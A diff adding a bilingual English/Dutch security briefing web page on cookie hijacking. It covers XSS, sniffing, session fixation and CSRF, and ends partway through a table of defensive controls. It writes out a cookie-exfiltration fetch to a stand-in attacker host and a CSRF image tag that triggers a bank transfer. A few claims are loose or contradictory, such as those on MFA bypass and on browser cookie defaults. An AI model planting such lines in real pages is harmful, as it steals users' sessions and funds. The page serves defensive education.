@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<title>Cookie hijacking // Plain Security</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+/* ===============================================================
+   COOKIE HIJACKING // BRIEFING
+   =============================================================== */
+
+:root{
+  --deep:#051324;
+  --bg:#0b1b2b;
+  --bg-lo:#081727;
+  --bg-hi:#0d1e2d;
+  --surface:#2a4858;
+  --slate:#637b88;
+  --muted:#87a2b0;
+  --body:#c8d8e1;
+  --prose:#e6eff5;
+  --white:#ffffff;
+  --line:#335364;
+  --line-soft:#1d3444;
+  --good:#37d39b;
+  --warn:#ffc857;
+  --bad:#ff5d73;
+  --bad-soft:#ffb3be;
+  --brand:#5ac8fa;
+  --mono:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  --read:"Inter",system-ui,-apple-system,"Segoe UI",Helvetica,Arial,sans-serif;
+  --sans:"Poppins","Montserrat",system-ui,-apple-system,"Segoe UI",sans-serif;
+}
+
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  background:var(--bg);
+  color:var(--body);
+  font-family:var(--mono);
+  font-size:15px;
+  line-height:1.75;
+  -webkit-font-smoothing:antialiased;
+}
+::selection{background:var(--slate);color:var(--deep)}
+
+.wrap{max-width:1180px;margin:0 auto;padding:0 40px}
+
+/* ---------- nav ---------- */
+nav{background:var(--deep);border-bottom:1px solid var(--line-soft);position:sticky;top:0;z-index:50}
+.nav-in{max-width:1180px;margin:0 auto;padding:0 40px;height:64px;display:flex;align-items:center;gap:30px}
+.brand{display:flex;align-items:center;gap:12px;font-weight:700;letter-spacing:.22em;font-size:13px;color:var(--white)}
+.brand i{width:13px;height:13px;background:var(--slate);display:block}
+.nav-links{display:flex;gap:26px;margin-left:auto;font-size:12px;letter-spacing:.18em}
+.nav-links a{color:var(--muted);text-decoration:none;padding:6px 0;border-bottom:2px solid transparent}
+.nav-links a:hover{color:var(--white);border-bottom-color:var(--slate)}
+
+.lang{display:flex;border:1px solid var(--line);margin-left:8px}
+.lang input{position:absolute;opacity:0;pointer-events:none}
+.lang label{cursor:pointer;padding:6px 14px;font-size:11px;letter-spacing:.18em;font-weight:700;color:var(--muted);user-select:none;transition:.15s}
+.lang label:hover{color:var(--white)}
+#lang-en:checked ~ label[for=lang-en],
+#lang-nl:checked ~ label[for=lang-nl]{background:var(--slate);color:var(--deep)}
+
+/* ---------- i18n ---------- */
+.en,.nl{display:none}
+body:has(#lang-en:checked) .en{display:revert}
+body:has(#lang-nl:checked) .nl{display:revert}
+
+/* ---------- hero ---------- */
+.hero{padding:86px 0 70px;background:linear-gradient(180deg,var(--bg-lo),var(--bg))}
+.kicker{font-size:12px;letter-spacing:.34em;color:var(--muted);text-transform:uppercase;display:block;margin-bottom:20px;font-weight:500}
+.kicker b{color:var(--slate);font-weight:700;margin-right:10px}
+h1{font-family:var(--sans);font-weight:800;color:var(--white);font-size:clamp(28px,4vw,52px);line-height:1.04;letter-spacing:-.025em;margin:0 0 22px}
+h1 em{font-style:normal;color:var(--muted)}
+.lede{font-family:var(--read);font-size:clamp(15px,1.5vw,18px);line-height:1.65;color:var(--prose);max-width:62ch;margin:0}
+.btns{display:flex;flex-wrap:wrap;gap:16px;margin-top:38px}
+.btn{display:inline-block;padding:16px 34px;font-size:12px;font-weight:700;letter-spacing:.2em;text-decoration:none;text-transform:uppercase;transition:.16s}
+.btn.solid{background:var(--slate);color:var(--deep)}
+.btn.solid:hover{background:var(--white)}
+.btn.ghost{border:1px solid var(--line);color:var(--body)}
+.btn.ghost:hover{border-color:var(--slate);color:var(--white)}
+
+/* ---------- segmented divider ---------- */
+.divider{display:flex;height:4px;width:100%}
+.divider i{display:block;height:100%}
+.divider i:nth-child(1){width:5%;background:var(--white)}
+.divider i:nth-child(2){width:30%;background:var(--slate)}
+.divider i:nth-child(3){width:30%;background:var(--surface)}
+.divider i:nth-child(4){width:35%;background:#242424}
+
+/* ---------- sections ---------- */
+section.risk-block{padding:74px 0 78px}
+section.risk-block:nth-of-type(even){background:var(--bg-hi)}
+h2{font-family:var(--sans);font-weight:700;color:var(--white);font-size:clamp(21px,2.6vw,32px);line-height:1.15;letter-spacing:-.015em;margin:0 0 20px}
+h2 em{font-style:normal;color:var(--muted)}
+.term{display:block;font-size:12px;letter-spacing:.2em;color:var(--slate);text-transform:uppercase;margin:-14px 0 30px}
+
+/* ---------- panel ---------- */
+.panel{background:var(--surface);border:1px solid var(--line);padding:36px 40px}
+.panel:has(> p){max-width:900px}
+.panel p{font-family:var(--read);font-size:16px;line-height:1.72;letter-spacing:.005em;margin:0 0 18px;color:var(--prose);max-width:70ch}
+.panel p:last-of-type{margin-bottom:0}
+.panel strong{color:var(--white);font-weight:700}
+.panel em{font-style:italic;color:var(--white)}
+.panel code{font-family:var(--mono);background:var(--bg-lo);border:1px solid var(--line);padding:1px 7px;color:var(--white);font-size:13px}
+
+.pills{display:flex;flex-wrap:wrap;gap:14px;margin-top:26px}
+.pill{font-size:11px;letter-spacing:.16em;font-weight:700;text-transform:uppercase;padding:12px 18px;display:inline-flex;gap:10px;align-items:center}
+.pill.risk{background:rgba(255,93,115,.12);border:1px solid rgba(255,93,115,.4);color:var(--bad-soft)}
+.pill.fix{background:rgba(55,211,155,.1);border:1px solid rgba(55,211,155,.4);color:#8ff0cd}
+
+/* =========================================================
+   STAGE
+   ========================================================= */
+.stage{position:relative;height:280px;margin:0 0 30px;overflow:hidden;background:var(--bg-lo);border:1px solid var(--line)}
+.stage::after{
+  content:"";position:absolute;inset:0;pointer-events:none;opacity:.5;
+  background-image:linear-gradient(rgba(99,123,136,.08) 1px,transparent 1px),
+                   linear-gradient(90deg,rgba(99,123,136,.08) 1px,transparent 1px);
+  background-size:30px 30px
+}
+.stage-label{position:absolute;top:0;left:0;z-index:4;font-size:10px;letter-spacing:.24em;color:var(--deep);background:var(--slate);padding:5px 12px;font-weight:700}
+
+.cookie-box{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:240px;padding:24px;background:var(--surface);border:2px solid var(--line);text-align:center;z-index:3}
+.cookie-box .title{font-size:13px;letter-spacing:.2em;color:var(--slate);text-transform:uppercase;margin-bottom:12px;font-weight:700}
+.cookie-box .value{font-family:var(--sans);font-weight:700;font-size:24px;color:var(--white);margin-bottom:8px}
+.cookie-box .desc{font-size:12px;color:var(--muted);line-height:1.4}
+.cookie-box.weak{border-color:var(--bad);background:rgba(255,93,115,.08)}
+.cookie-box.weak .title{color:var(--bad-soft)}
+
+/* ---------- table ---------- */
+table{width:100%;border-collapse:collapse;margin-top:2px}
+th{text-align:left;padding:12px 14px;font-size:10.5px;letter-spacing:.2em;text-transform:uppercase;color:var(--deep);background:var(--slate);font-weight:700}
+td{font-family:var(--read);font-size:15px;line-height:1.6;text-align:left;padding:15px 14px;border-bottom:1px solid var(--line);vertical-align:top;color:var(--prose)}
+td.ctl{font-family:var(--mono);font-weight:700;color:var(--white);white-space:nowrap;letter-spacing:.04em;font-size:13.5px}
+tr:last-child td{border-bottom:none}
+
+.callout{font-family:var(--read);margin-top:28px;padding:24px 28px;background:var(--bg-lo);border:1px solid var(--line);border-left:4px solid var(--good);color:var(--prose);font-size:15.5px;line-height:1.7;max-width:76ch}
+.callout strong{color:var(--white)}
+
+/* ---------- footer ---------- */
+footer{background:var(--deep);border-top:1px solid var(--line-soft);padding:34px 0}
+.meta{font-size:11px;letter-spacing:.18em;color:var(--slate);text-transform:uppercase}
+.meta .sep{color:var(--line)}
+
+/* ---------- responsive ---------- */
+@media (max-width:820px){
+  .wrap,.nav-in{padding:0 22px}
+  .nav-links{display:none}
+  .panel{padding:24px 22px}
+  table{font-size:12.5px}
+  .brand{font-size:11px;letter-spacing:.14em}
+  .panel tbody,.panel tr,.panel td{display:block;width:100%;box-sizing:border-box}
+  body:has(#lang-en:checked) .panel table.en,body:has(#lang-nl:checked) .panel table.nl{display:block;width:100%}
+  .panel tr:first-child{display:none}
+  .panel tr{padding:14px 0;border-bottom:1px solid var(--line)}
+  .panel tr:last-child{border-bottom:none}
+  .panel td{padding:3px 0;border-bottom:none;white-space:normal}
+  td.ctl{font-size:14px;padding-bottom:6px}
+  #risk td:nth-child(n+2)::before{display:block;font-size:10px;letter-spacing:.2em;text-transform:uppercase;color:var(--slate);margin:8px 0 2px}
+  #risk table.en td:nth-child(2)::before{content:"What it requires of you"}
+  #risk table.en td:nth-child(3)::before{content:"When a supplier hands you their report"}
+  #risk table.en td:nth-child(4)::before{content:"When this incident happens"}
+  #risk table.nl td:nth-child(2)::before{content:"Wat het van u vraagt"}
+  #risk table.nl td:nth-child(3)::before{content:"Als een leverancier u zijn rapport geeft"}
+  #risk table.nl td:nth-child(4)::before{content:"Als dit incident u treft"}
+}
+@media (prefers-reduced-motion:reduce){
+  *{animation:none!important}
+}
+
+/* ---------- risk & compliance ---------- */
+.risk-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:26px}
+.risk-item{background:var(--bg-lo);border:1px solid var(--line);padding:18px 20px}
+.risk-item .k{display:block;font-size:10.5px;letter-spacing:.2em;text-transform:uppercase;color:var(--slate);margin-bottom:8px}
+.risk-item .v{display:block;font-family:var(--sans);font-weight:700;font-size:18px;color:var(--white);margin-bottom:6px}
+.risk-item .v.hi{color:var(--bad-soft)}.risk-item .v.mid{color:var(--warn)}.risk-item .v.lo{color:#8ff0cd}
+.risk-item p{font-family:var(--read);font-size:14px;line-height:1.55;color:var(--body);margin:0}
+.risk-item.w2{grid-column:span 2}.risk-item.wide{grid-column:1/-1}
+@media (max-width:820px){.risk-grid{grid-template-columns:1fr}.risk-item.w2{grid-column:auto}}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-in">
+    <a class="brand" href="../" style="text-decoration:none"><img src="../favicon.svg" width="20" height="20" alt="" style="display:block"> PLAIN SECURITY <span style="color:var(--slate)">//</span> COOKIES</a>
+    <div class="nav-links">
+      <a href="#r1"><span class="en">SESSION HIJACK</span><span class="nl">SESSIE KAPEN</span></a>
+      <a href="#r2"><span class="en">MAN-IN-MIDDLE</span><span class="nl">MAN-IN-MIDDLE</span></a>
+      <a href="#r3"><span class="en">FIXATION</span><span class="nl">FIXATIE</span></a>
+      <a href="#r4"><span class="en">THIRD-PARTY</span><span class="nl">DERDE PARTIJ</span></a>
+      <a href="#risk"><span class="en">RISK</span><span class="nl">RISICO</span></a>
+      <a href="#fix"><span class="en">CONTROLS</span><span class="nl">MAATREGELEN</span></a>
+    </div>
+    <div class="lang">
+      <input type="radio" name="lang" id="lang-en" checked>
+      <input type="radio" name="lang" id="lang-nl">
+      <label for="lang-en">EN</label>
+      <label for="lang-nl">NL</label>
+    </div>
+<script>
+(function(){var k='plain-security-lang',r=null;try{r=localStorage.getItem(k)}catch(e){}
+if(r==='nl'||r==='en'){document.getElementById('lang-'+r).checked=true;document.documentElement.lang=r}
+document.querySelectorAll('input[name=lang]').forEach(function(i){i.addEventListener('change',function(){var l=i.id.slice(5);document.documentElement.lang=l;try{localStorage.setItem(k,l)}catch(e){}})})})();
+</script>
+  </div>
+</nav>
+
+<!-- ============================ HERO ============================ -->
+<div class="hero">
+  <div class="wrap">
+    <span class="kicker"><b>//</b> BRIEFING</span>
+    <h1>
+      <span class="en">Cookie hijacking. <em>How attackers use borrowed credentials.</em></span>
+      <span class="nl">Cookie-kaperij. <em>Hoe aanvallers geleende inloggegevens misbruiken.</em></span>
+    </h1>
+    <p class="lede">
+      <span class="en">A stolen cookie means stolen authentication. Attackers use intercepted cookies to access systems without knowing passwords, bypass multi-factor authentication, and impersonate users to trusted downstream systems.</span>
+      <span class="nl">Een gestolen cookie betekent gestolen authenticatie. Aanvallers gebruiken onderschepte cookies om systemen zonder wachtwoord te benaderen, multi-factor authenticatie te omzeilen en gebruikers na te bootsen op vertrouwde downstream-systemen.</span>
+    </p>
+    <div class="btns">
+      <a class="btn solid" href="#r1"><span class="en">SEE THE RISKS</span><span class="nl">BEKIJK DE RISICO'S</span></a>
+      <a class="btn ghost" href="#fix"><span class="en">WHAT CONTAINS IT</span><span class="nl">WAT HET BEHEERST</span></a>
+    </div>
+  </div>
+</div>
+
+<div class="divider"><i></i><i></i><i></i><i></i></div>
+
+<!-- ============================ 01 ============================ -->
+<section class="risk-block" id="r1">
+  <div class="wrap">
+    <span class="kicker"><b>//</b> <span class="en">RISK 01</span><span class="nl">RISICO 01</span></span>
+    <h2>
+      <span class="en">The browser trusted the script. <em>So did the attacker.</em></span>
+      <span class="nl">De browser vertrouwde het script. <em>De aanvaller ook.</em></span>
+    </h2>
+    <span class="term">
+      <span class="en">cross-site scripting / xss / credential theft</span>
+      <span class="nl">cross-site scripting / xss / diefstal referenties</span>
+    </span>
+
+    <div class="stage">
+      <div class="stage-label"><span class="en">BROWSER MEMORY</span><span class="nl">BROWSER GEHEUGEN</span></div>
+      <div class="cookie-box weak">
+        <div class="title"><span class="en">Session Cookie</span><span class="nl">Sessie Cookie</span></div>
+        <div class="value">readable</div>
+        <div class="desc"><span class="en">JavaScript can access — attacker's malware steals it</span><span class="nl">JavaScript kan eraan — aanvallers malware steelt het</span></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <p class="en">A user visits a news site that runs an old advertising library. The library has an XSS vulnerability. An attacker injects malicious JavaScript into ads served to the site. The JavaScript runs in the user's browser with the same privileges as the page — it can read cookies stored by the browser. A single line of JavaScript: <code>fetch('https://attacker.com/steal?c=' + document.cookie)</code> sends every cookie to the attacker. Now the attacker has the user's session cookie for their bank, their SaaS platform, their email. The user has no idea. The padlock is still there. They log out and back in, and the attacker can log in from anywhere.</p>
+      <p class="en"><strong>Business impact:</strong> an attacker gains access to the user's authenticated sessions without knowing their password or bypassing multi-factor authentication. They can transfer money, read sensitive emails, change permissions, and impersonate the user to downstream systems that trusted the session cookie as proof of identity.</p>
+      <p class="nl">Een gebruiker bezoekt een nieuwssite die een oude advertentairebibliotheek gebruikt. De bibliotheek heeft een XSS-kwetsbaarheid. Een aanvaller injecteert schadelijke JavaScript in advertenties die op de site worden weergegeven. De JavaScript wordt in de browser van de gebruiker uitgevoerd met dezelfde rechten als de pagina — deze kan cookies lezen die door de browser zijn opgeslagen. Een enkele regel JavaScript: <code>fetch('https://attacker.com/steal?c=' + document.cookie)</code> stuurt elke cookie naar de aanvaller. Nu heeft de aanvaller de sessiecookie van de gebruiker voor hun bank, hun SaaS-platform, hun e-mail. De gebruiker heeft geen idee. Het hangslot staat er nog. Ze melden zich af en opnieuw aan, en de aanvaller kan zich van overal inloggen.</p>
+      <p class="nl"><strong>Bedrijfsimpact:</strong> een aanvaller krijgt toegang tot de geverifieerde sessies van de gebruiker zonder hun wachtwoord te kennen of multi-factor authenticatie te omzeilen. Ze kunnen geld overmaken, gevoelige e-mails lezen, machtigingen wijzigen en de gebruiker op downstream-systemen nabootsen die de sessiecookie als identiteitsbewijs vertrouwden.</p>
+    </div>
+
+    <div class="pills">
+      <span class="pill risk">⚠ <span class="en">INVISIBLE ATTACK · NO MFA BYPASS · SESSION THEFT</span><span class="nl">ONZICHTBARE AANVAL · GEEN MFA BYPASS · SESSIE DIEFSTAL</span></span>
+      <span class="pill fix">✔ <span class="en">FIX: HTTPONLY FLAG — JAVASCRIPT CANNOT ACCESS</span><span class="nl">OPLOSSING: HTTPONLY VLAG — JAVASCRIPT KAN NIET BENADEREN</span></span>
+    </div>
+  </div>
+</section>
+
+<!-- ============================ 02 ============================ -->
+<section class="risk-block" id="r2">
+  <div class="wrap">
+    <span class="kicker"><b>//</b> <span class="en">RISK 02</span><span class="nl">RISICO 02</span></span>
+    <h2>
+      <span class="en">The browser sent the cookie. <em>The attacker caught it.</em></span>
+      <span class="nl">De browser stuurde de cookie. <em>De aanvaller ving het op.</em></span>
+    </h2>
+    <span class="term">
+      <span class="en">man-in-the-middle / packet sniffing / unencrypted transit</span>
+      <span class="nl">man-in-the-middle / pakketsniffing / onversleutelde overdracht</span>
+    </span>
+
+    <div class="stage">
+      <div class="stage-label"><span class="en">NETWORK TRAFFIC</span><span class="nl">NETWERKVERKEER</span></div>
+      <div class="cookie-box weak">
+        <div class="title"><span class="en">Cookie Sent</span><span class="nl">Cookie Verzonden</span></div>
+        <div class="value">unencrypted</div>
+        <div class="desc"><span class="en">HTTP allows reading — attacker on WiFi sees it</span><span class="nl">HTTP staat lezen toe — aanvaller op WiFi ziet het</span></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <p class="en">A user connects to an airport WiFi network that looks legitimate. The network is run by an attacker. When the user's browser sends a request over HTTP (not HTTPS), every packet travels in plain text: headers, cookies, and body. The attacker's computer is a network sniffer — it captures every packet. Now they have the user's session cookie. Even if the user later upgrades to HTTPS, the initial HTTP request revealed the cookie. Many applications offer cookie-over-HTTPS but miss early requests, have endpoints that allow HTTP fallback, or users visit insecure versions before being redirected. An attacker on the network path can always capture these cookies.</p>
+      <p class="en"><strong>Business impact:</strong> any attacker with network access (compromised WiFi, router hijacking, ISP-level interception, or a carrier in some regions) can read session cookies from unencrypted traffic and assume the user's identity immediately. This is particularly severe for mobile users who often connect to untrusted networks.</p>
+      <p class="nl">Een gebruiker maakt verbinding met een luchthavenwifi-netwerk dat legitiem lijkt. Het netwerk wordt beheerd door een aanvaller. Wanneer de browser van de gebruiker een aanvraag via HTTP verzendt (niet HTTPS), reist elk pakket in leesbare tekst: headers, cookies en body. De computer van de aanvaller is een netwerksnuffer — deze legt elk pakket vast. Nu hebben ze de sessiecookie van de gebruiker. Zelfs als de gebruiker later naar HTTPS upgradet, ontbulde het eerste HTTP-verzoek de cookie. Veel toepassingen bieden cookie-over-HTTPS maar missen vroege verzoeken, hebben eindpunten die HTTP-terugval toestaan, of gebruikers bezoeken onveilige versies voordat ze worden omgeleid. Een aanvaller op het netwerkpad kan deze cookies altijd vastleggen.</p>
+      <p class="nl"><strong>Bedrijfsimpact:</strong> elke aanvaller met netwerktoegang (gecompromitteerde WiFi, routerkaping, ISP-niveau-onderschepping of een provider in sommige regio's) kan sessiecookies uit onversleuteld verkeer lezen en de identiteit van de gebruiker onmiddellijk aannemen. Dit is bijzonder ernstig voor mobiele gebruikers die zich vaak verbinden met onvertrouwde netwerken.</p>
+    </div>
+
+    <div class="pills">
+      <span class="pill risk">⚠ <span class="en">NETWORK PASSIVE ATTACK · WIFI HIJACKING · IMMEDIATE ACCESS</span><span class="nl">NETWERK PASSIEVE AANVAL · WIFI KAPING · DIRECTE TOEGANG</span></span>
+      <span class="pill fix">✔ <span class="en">FIX: SECURE FLAG — HTTPS ONLY, NEVER OVER HTTP</span><span class="nl">OPLOSSING: SECURE VLAG — ALLEEN HTTPS, NOOIT OVER HTTP</span></span>
+    </div>
+  </div>
+</section>
+
+<!-- ============================ 03 ============================ -->
+<section class="risk-block" id="r3">
+  <div class="wrap">
+    <span class="kicker"><b>//</b> <span class="en">RISK 03</span><span class="nl">RISICO 03</span></span>
+    <h2>
+      <span class="en">We assigned the session ID. <em>The attacker knew it first.</em></span>
+      <span class="nl">We wezen de sessie-id toe. <em>De aanvaller kende het eerst.</em></span>
+    </h2>
+    <span class="term">
+      <span class="en">session fixation / predictable identifiers / preauth attacks</span>
+      <span class="nl">sessie fixatie / voorspelbare identificatie / pre-auth aanvallen</span>
+    </span>
+
+    <div class="stage">
+      <div class="stage-label"><span class="en">LOGIN FLOW</span><span class="nl">INLOGSTROOM</span></div>
+      <div class="cookie-box weak">
+        <div class="title"><span class="en">Session ID</span><span class="nl">Sessie-ID</span></div>
+        <div class="value">predictable</div>
+        <div class="desc"><span class="en">Sequential or weak randomness — attacker guesses</span><span class="nl">Sequentieel of zwakke willekeurigheid — aanvaller raadt</span></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <p class="en">An attacker sends a user a link with a session cookie already baked in: the attacker visits the login page, gets assigned session ID "12345", and crafts a URL with that ID. They send the user the link. The user clicks it and logs in — the application reuses the same session ID rather than generating a new one. Now both the user and attacker share the same session. The attacker already had that session ID, so they can use it to impersonate the user. Alternatively, an application assigns session IDs sequentially (1, 2, 3, 4…) or with weak randomness. An attacker can guess the next session ID, create an authenticated session under a false identity, and when a real user's request comes in, the attacker is already inside.</p>
+      <p class="en"><strong>Business impact:</strong> an attacker can establish access to an account before the user even logs in, or can take over an existing session without stealing credentials. Many implementations regenerate the session ID on login but forget to invalidate the old one, leaving a window where both are valid.</p>
+      <p class="nl">Een aanvaller stuurt een gebruiker een link met een sessiecookie al ingebakken: de aanvaller bezoekt de inlogpagina, krijgt sessie-ID "12345" toegewezen en maakt een URL met die ID. Ze sturen de gebruiker de link. De gebruiker klikt erop en meldt zich aan — de toepassing hergebruikt dezelfde sessie-ID in plaats van een nieuwe te genereren. Nu delen de gebruiker en aanvaller dezelfde sessie. De aanvaller had die sessie-ID al, dus kunnen ze deze gebruiken om de gebruiker na te bootsen. Als alternatief wijst een toepassing sessie-ID's sequentieel toe (1, 2, 3, 4…) of met zwakke willekeurigheid. Een aanvaller kan de volgende sessie-ID raden, een geverifieerde sessie onder een valse identiteit creëren, en als verzoek van een echte gebruiker binnenkomt, is de aanvaller al binnengekomen.</p>
+      <p class="nl"><strong>Bedrijfsimpact:</strong> een aanvaller kan toegang tot een account tot stand brengen voordat de gebruiker zich zelfs maar aanmeldt, of kan een bestaande sessie overnemen zonder referenties te stelen. Veel implementaties regenereren de sessie-ID bij inloggen maar vergeten de oude ongeldig te maken, waardoor een venster overblijft waarin beide geldig zijn.</p>
+    </div>
+
+    <div class="pills">
+      <span class="pill risk">⚠ <span class="en">ATTACKER-CONTROLLED SESSION · BEFORE AUTH · WEAK RANDOMNESS</span><span class="nl">DOOR AANVALLER GECONTROLEERDE SESSIE · VOOR AUTH · ZWAKKE WILLEKEURIGHEID</span></span>
+      <span class="pill fix">✔ <span class="en">FIX: CRYPTOGRAPHIC RANDOMNESS, REGENERATE ON LOGIN</span><span class="nl">OPLOSSING: CRYPTOGRAFISCHE WILLEKEURIGHEID, REGENEREREN BIJ INLOGGEN</span></span>
+    </div>
+  </div>
+</section>
+
+<!-- ============================ 04 ============================ -->
+<section class="risk-block" id="r4">
+  <div class="wrap">
+    <span class="kicker"><b>//</b> <span class="en">RISK 04</span><span class="nl">RISICO 04</span></span>
+    <h2>
+      <span class="en">The browser sent the cookie automatically. <em>To a site the user never intended.</em></span>
+      <span class="nl">De browser stuurde de cookie automatisch. <em>Naar een site die de gebruiker nooit bedoelde.</em></span>
+    </h2>
+    <span class="term">
+      <span class="en">cross-site request forgery / csrf / third-party cookies / samesite</span>
+      <span class="nl">cross-site request forgery / csrf / cookies van derden / samesite</span>
+    </span>
+
+    <div class="stage">
+      <div class="stage-label"><span class="en">CROSS-DOMAIN REQUEST</span><span class="nl">CROSS-DOMAIN VERZOEK</span></div>
+      <div class="cookie-box weak">
+        <div class="title"><span class="en">Cookie Sent</span><span class="nl">Cookie Verzonden</span></div>
+        <div class="value">automatically</div>
+        <div class="desc"><span class="en">Browser sends to third-party sites — no samesite</span><span class="nl">Browser stuurt naar sites van derden — geen samesite</span></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <p class="en">A user logs into their bank at bank.com. The session cookie is set. The user does not log out. They visit an attacker-controlled site, attacker.com. The attacker's site contains a hidden image tag: <code>&lt;img src="https://bank.com/transfer?to=attacker&amount=1000"&gt;</code>. When the browser loads the page, it fetches the image. The browser automatically includes the user's bank session cookie with every request to bank.com, even though the request came from attacker.com. The user's bank sees an authenticated request that looks legitimate. The money transfers. The user has no idea. This is CSRF — the browser's default behavior is to send cookies to any site, including requests that came from other sites.</p>
+      <p class="en"><strong>Business impact:</strong> an attacker can craft requests that the user's browser will execute as if the user intended them, using the user's authenticated session. Money transfers, permission changes, password resets, and data deletions can all happen without the user knowing. Third-party cookies also leak session identifiers to advertisers, data brokers, and any site the user visits while logged in.</p>
+      <p class="nl">Een gebruiker meldt zich aan bij hun bank op bank.com. De sessiecookie wordt ingesteld. De gebruiker meldt zich niet af. Ze bezoeken een door aanvallers gecontroleerde site, attacker.com. De site van de aanvaller bevat een verborgen afbeeldingscode: <code>&lt;img src="https://bank.com/transfer?to=attacker&amount=1000"&gt;</code>. Wanneer de browser de pagina laadt, haalt deze de afbeelding op. De browser voegt automatisch de sessiecookie van de gebruiker's bank in bij elk verzoek naar bank.com, ook al kwam het verzoek van attacker.com. De bank van de gebruiker ziet een geverifieerd verzoek dat er legitiem uitziet. Het geld wordt overgedragen. De gebruiker heeft geen idee. Dit is CSRF — het standaardgedrag van browsers is cookies naar elke site te sturen, inclusief verzoeken die van andere sites kwamen.</p>
+      <p class="nl"><strong>Bedrijfsimpact:</strong> een aanvaller kan verzoeken opstellen die de browser van de gebruiker zal uitvoeren alsof de gebruiker dit bedoelde, met behulp van de geverifieerde sessie van de gebruiker. Geldoverdrachten, rechtenwijzigingen, wachtwoordherstel en gegevensverwijderingen kunnen allemaal zonder medeweten van de gebruiker plaatsvinden. Cookies van derden lekken ook sessie-identificatoren aan adverteerders, gegevensmakelaars en elke site die de gebruiker bezoekt terwijl deze is ingelogd.</p>
+    </div>
+
+    <div class="pills">
+      <span class="pill risk">⚠ <span class="en">BROWSER DEFAULT · AUTOMATED REQUEST · DATA EXFILTRATION</span><span class="nl">BROWSER STANDAARD · GEAUTOMATISEERDE VERZOEK · GEGEVENS EXFILTRATIE</span></span>
+      <span class="pill fix">✔ <span class="en">FIX: SAMESITE=STRICT, DISABLE THIRD-PARTY COOKIES</span><span class="nl">OPLOSSING: SAMESITE=STRICT, COOKIES VAN DERDEN UITSCHAKELEN</span></span>
+    </div>
+  </div>
+</section>
+
+<!-- ============================ CONTROLS ============================ -->
+<section class="risk-block" id="fix">
+  <div class="wrap">
+    <span class="kicker"><b>//</b> <span class="en">CONTROLS</span><span class="nl">MAATREGELEN</span></span>
+    <h2>
+      <span class="en">What <em>keeps it contained.</em></span>
+      <span class="nl">Wat het <em>beheersbaar houdt.</em></span>
+    </h2>
+    <span class="term">
+      <span class="en">cookie security flags, samesite attributes, and monitoring</span>
+      <span class="nl">cookiebeveiligingsvlaggen, samesite-attributen en monitoring</span>
+    </span>
+
+    <div class="panel">
+      <table class="en">
+        <tr><th>Control</th><th>Contains</th><th>In one line</th></tr>
+        <tr><td class="ctl">HTTPOnly flag</td><td>XSS theft (01)</td><td>Set HTTPOnly on every session cookie. JavaScript cannot read it. If XSS happens, the attacker cannot steal the cookie.</td></tr>
+        <tr><td class="ctl">Secure flag</td><td>Network interception (02)</td><td>Set Secure on every authentication cookie. Browser will only send over HTTPS. Never set a session cookie without it.</td></tr>
+        <tr><td class="ctl">HTTPS only</td><td>Network interception (02)</td><td>Enforce HTTPS site-wide. Redirect HTTP to HTTPS, send HSTS header with a long max-age. No HTTP fallback, ever.</td></tr>
+        <tr><td class="ctl">Cryptographic randomness</td><td>Session fixation (03)</td><td>Session IDs must be generated with a cryptographically secure random number generator. Never sequential, never weak. Use platform defaults like Python's secrets or Node's crypto.randomBytes.</td></tr>
+        <tr><td class="ctl">Regenerate on login</td><td>Session fixation (03)</td><td>When a user logs in, generate a new session ID. Invalidate the old one immediately. Do not allow both to be valid at the same time.</td></tr>
+        <tr><td class="ctl">SameSite=Strict</td><td>CSRF / third-party (04)</td><td>Set SameSite=Strict on all cookies, especially session cookies. Browser will not send the cookie in cross-site requests at all. SameSite=Lax is a fallback only if Strict breaks legitimate flows.</td></tr>
+        <tr><td class="ctl">Disable third-party cookies</td><td>Third-party tracking (04)</td><td>Browser default is to send cookies in cross-site requests. Many browsers now block third-party cookies by default; make sure your application does not rely on them.</td></tr>
+        <tr><td class="ctl">Input validation</td><td>XSS / CSRF (01, 04)</td><td>Sanitize and validate all user input on the server side before rendering or processing. Even one missed input opens an XSS door.</td></tr>
+        <tr><td class="ctl">Monitoring and revocation</td><td>All four</td><td>Log all session creation and usage. Alert on concurrent sessions from different IPs, unusual timing patterns, or access from unexpected geographies. Support immediate cookie revocation without forcing a full password reset.</td></tr>
+      </table>
+
+      <table class="nl">
+        <tr><th>Maatregel</th><th>Beheerst</th><th>In één zin</th></tr>
+        <tr><td class="ctl">HTTPOnly-vlag</td><td>XSS-diefstal (01)</td><td>Stel HTTPOnly in op elke sessiecookie. JavaScript kan het niet lezen. Als XSS gebeurt, kan de aanvaller de cookie niet stelen.</td></tr>
+        <tr><td class="ctl">Secure-vlag</td><td>Netwerkonderschepping (02)</td><td>Stel Secure in op elke authenticatiecookie. Browser stuurt het alleen via HTTPS. Stel nooit een sessiecookie in zonder het.</td></tr>
+        <tr><td class="ctl">Alleen HTTPS</td><td>Netwerkonderschepping (02)</td><td>Dwing HTTPS site-breed af. Stuur HTTP om naar HTTPS, stuur HSTS-header met lange max-age. Geen HTTP-terugval, nooit.</td></tr>
+        <tr><td class="ctl">Cryptografische willekeurigheid</td><td>Sessie fixatie (03)</td><td>Sessie-ID's moeten worden gegenereerd met een cryptografisch veilige willekeurigsgenerator. Nooit sequentieel, nooit zwak. Gebruik platformstandaards zoals secrets van Python of crypto.randomBytes van Node.</td></tr>
+        <tr><td class="ctl">Regenereren bij inloggen</td><td>Sessie fixatie (03)</td><td>Wanneer een gebruiker zich aanmeldt, genereren nieuwe sessie-ID. Maak de oude onmiddellijk ongeldig. Sta beide niet tegelijkertijd toe als geldig.</td></tr>
